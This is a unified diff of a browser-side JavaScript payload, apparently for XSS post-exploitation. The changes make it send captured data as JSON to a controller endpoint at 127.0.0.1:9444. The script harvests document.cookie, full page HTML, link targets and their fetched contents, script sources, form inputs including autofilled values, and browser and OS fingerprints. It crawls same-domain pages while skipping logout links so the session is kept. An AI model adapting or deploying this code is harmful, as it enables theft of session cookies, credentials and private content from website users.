@@ -4,54 +4,66 @@ var typeLink = "LINK";
 var typeScript = "SCRIPT";
 var typeForm = "FORM";
 var typeBrowser = "BROWSER";
-var typeLocation = "LOCATION";
+// var typeLocation = "LOCATION";
 
 // List of URLs that were already crawled. Used to prevent loops and unnecessary multiple extractions.
 var sentUrlList = [];
 // Timestamp used to tag the data for current execution together.
 var timestamp = new Date().getTime();
 // Should the script crawl each link it finds containing the same domain name.
-var crawl = true;
+var crawl = false;
 
 // Send data back to the controller.
 function sendData(type, data) {
-    var domain = document.domain;
-    var url = document.location.href;
-    console.log(domain + " " + timestamp)
     console.log(type);
     console.log(data);
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://127.0.0.1:9444/data");
+    xhr.setRequestHeader('Content-type', 'application/json');
+    var data = JSON.stringify({
+        'domain': document.domain,
+        'timestamp': timestamp,
+        'type': type,
+        'data': data
+    });
+    xhr.send(data);
 }
 
 // Process all given links (a tags) and extract contents of each link. 
 function processLinks(url, allATags) {
-    var allLinks = {};
+    var allLinks = [];
     for (var i = 0; i < allATags.length; i++) {
         var text = allATags[i].text.trim();
         var href = allATags[i].href;
-        allLinks[href] = text;
+        var content = allATags[i].outerHTML;
+        allLinks.push({'link': href, 'text': text, 'content': content});
     }
-    sendData(typeLink, allLinks);
-    for (var link in allLinks) {
+    sendData(typeLink, { 'url': url, 'links': allLinks });
+    for (var i = 0; i < allLinks.length; i++) {
+        var currLink = allLinks[i];
+        var link = currLink['link'];
         if (validURL(link) && link.indexOf(document.domain) > -1 && sentUrlList.indexOf(link) == -1) {
             sentUrlList.push(link);
-            iframeFetch(typeContent, url, link);
+            iframeFetch(typeContent, null, link);
             try {
                 var xhr = new XMLHttpRequest();
                 xhr.onreadystatechange = function () {
                     if (xhr.readyState == XMLHttpRequest.DONE) {
                         if (xhr.status == 200) {
-                            sendData(typeContent, { 'url': url, 'link': link, 'content': xhr.responseText });
-                            // Once content is extracted try to gather more URLs from the extracted page.
-                            if (crawl) {
-                                processText(url, xhr.responseText);
+                            if (xhr.responseText != "") {
+                                sendData(typeContent, { 'url': link, 'content': xhr.responseText });
+                                // Once content is extracted try to gather more URLs from the extracted page.
+                                if (crawl) {
+                                    processText(url, xhr.responseText);
+                                }
                             }
                         }
                     }
                 };
-                xhr.open("GET", link, true);
+                xhr.open("GET", link);
                 xhr.send();
             } catch (err) {
-                console.log("No lnk fch")
+                console.log("No lnk fch");
             }
         }
     }
@@ -61,9 +73,10 @@ function processLinks(url, allATags) {
 function processScripts(url, allScriptTags) {
     for (var i = 0; i < allScriptTags.length; i++) {
         var src = allScriptTags[i].src;
-        var innerText = allScriptTags[i].innerText;
+        var content = allScriptTags[i].innerText;
+        if (typeof(content) == "undefined") content = "";
 
-        sendData(typeScript, { 'url': url, 'src': src, 'content': innerText });
+        sendData(typeScript, { 'url': url, 'src': src, 'content': content });
         if (src.trim() != "" && validURL(src) && sentUrlList.indexOf(src) == -1) {
             sentUrlList.push(src);
             // If src mentioned, extract the content of the JS file (if CORS restrictions are not there) and
@@ -74,14 +87,16 @@ function processScripts(url, allScriptTags) {
                 xhr.onreadystatechange = function () {
                     if (xhr.readyState == XMLHttpRequest.DONE) {
                         if (xhr.status == 200) {
-                            sendData(typeScript, { 'url': url, 'src': src, 'content': xhr.responseText });
+                            var content = xhr.responseText;
+                            if (typeof(content) == "undefined") content = "";
+                            sendData(typeScript, { 'url': url, 'src': src, 'content': content });
                         }
                     }
                 };
-                xhr.open("GET", src, true);
+                xhr.open("GET", src);
                 xhr.send();
             } catch (err) {
-                console.log("No scr fch")
+                console.log("No scr fch");
             }
         }
     }
@@ -93,15 +108,19 @@ function iframeFetch(type, url, src) {
 
         iframe.onload = function () {
             setTimeout(function () {
-                if (iframe.contentDocument != null && iframe.contentDocument.innerText != "") {
-                    if (type == typeContent) {
-                        sendData(typeContent, { 'url': url, 'link': src, 'content': iframe.contentDocument.innerText });
+                if (iframe.contentDocument != null 
+                    && iframe.contentDocument.documentElement != null 
+                    && iframe.contentDocument.documentElement.outerHTML != "") {
+                    var content = iframe.contentDocument.documentElement.outerHTML;
+                    if (typeof(content) == "undefined") content = "";
+                    if (type == typeContent && content != "") {
+                        sendData(typeContent, { 'url': src, 'content': content });
                         // Once content is extracted try to gather more URLs from the extracted page.
                         if (crawl) {
                             processNode(iframe.contentDocument);
                         }
                     } else if (type == typeScript) {
-                        sendData(type, { 'url': url, 'src': src, 'content': iframe.contentDocument.innerText });
+                        sendData(typeScript, { 'url': url, 'src': src, 'content': content });
                     }
                 }
             }, 1000);
@@ -113,7 +132,7 @@ function iframeFetch(type, url, src) {
         iframe.src = src;
 
         body = document.getElementsByTagName('body')[0];
-        body.appendChild(iframe)
+        body.appendChild(iframe);
     } catch (err) {
         console.log("Iframe load failed for " + src);
     }
@@ -136,7 +155,15 @@ function processForms(url, allFormTags) {
                 // This will extract auto filled content values. 
                 var value = input.value;
                 var placeholder = input.placeholder;
-                allProcessedInputs.push({ 'name': name, 'type': type, 'value': value, 'placeholder': placeholder });
+                var contents = input.outerHTML;
+
+                allProcessedInputs.push({ 
+                    'name': name, 
+                    'type': type, 
+                    'value': value, 
+                    'placeholder': placeholder, 
+                    'content': contents 
+                });
             }
 
             // Extract the source of the entire form. 
@@ -147,7 +174,13 @@ function processForms(url, allFormTags) {
                 contents = allFormTags[i].innerHTML;
             }
 
-            sendData(typeForm, { 'url': url, 'action': action, 'method': method, 'content': contents, 'inputs': allProcessedInputs });
+            sendData(typeForm, { 
+                'url': url, 
+                'action': action, 
+                'method': method, 
+                'content': contents, 
+                'inputs': allProcessedInputs
+            });
         }
     }
 }
@@ -258,19 +291,20 @@ function processBrowser() {
     }
 
     var data = {
-        'BrowserName': browserName,
-        'FullVersion': fullVersion,
-        'MajorVersion': majorVersion,
-        'navigator.appName': navigator.appName,
-        'navigator.appVersion': navigator.appVersion,
-        'navigator.userAgent': navigator.userAgent,
-        'PluginList': pluginList
+        'name': browserName,
+        'full_version': fullVersion,
+        'major_version': majorVersion,
+        'navigator_appname': navigator.appName,
+        'navigator_appversion': navigator.appVersion,
+        'navigator_useragent': navigator.userAgent,
+        'plugin_list': pluginList,
+        'os': OSName
     };
 
     sendData(typeBrowser, data);
 
     // Credit: https://stackoverflow.com/questions/391979/how-to-get-clients-ip-address-using-javascript
-    try {
+    /* try {
         var req = new XMLHttpRequest();
         req.overrideMimeType("application/json");
         req.open('GET', 'https://ipapi.co/json/', true);
@@ -278,13 +312,13 @@ function processBrowser() {
             try {
                 sendData(typeLocation, JSON.parse(req.responseText));
             } catch (err) {
-                console.log("No loq")
+                console.log("No loq");
             }
         };
         req.send(null);
     } catch (err) {
         console.log("No loq")
-    }
+    }*/
 }
 
 // Credit: https://plainjs.com/javascript/events/running-code-when-the-document-is-ready-15/
@@ -310,13 +344,13 @@ function validURL(str) {
         '(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator*/
 
     //Defining the logout pattern
-    var logoutPattern = new RegExp('logout|signout|log-out|sign-out')
+    var logoutPattern = new RegExp('logout|signout|log-out|sign-out');
 
     //if valid URL and does not contain logout
-    if (/*urlPattern.test(str) &&*/ !logoutPattern.test(str.toLowerCase())) {
-        return true
+    if (str != null && typeof(str) == "string" && /*urlPattern.test(str) &&*/ !logoutPattern.test(str.toLowerCase())) {
+        return true;
     } else {
-        return false
+        return false;
     }
 }
 
@@ -324,7 +358,9 @@ ready(function () {
     // Extract and send cookies.
     try {
         var cookieValues = document.cookie;
-        sendData(typeCookie, cookieValues);
+        if (cookieValues != null && cookieValues != "") {
+            sendData(typeCookie, { 'content': cookieValues });
+        }
     } catch (err) {
         console.log("No cki data");
     }
@@ -338,6 +374,7 @@ ready(function () {
 
     // Process documents for different interesting tags (links/scripts/forms) and send such information. 
     try {
+        sendData(typeContent, { 'url': document.location.href, 'content': document.documentElement.outerHTML });
         processNode(document);
     } catch (err) {
         console.log("No doc data");
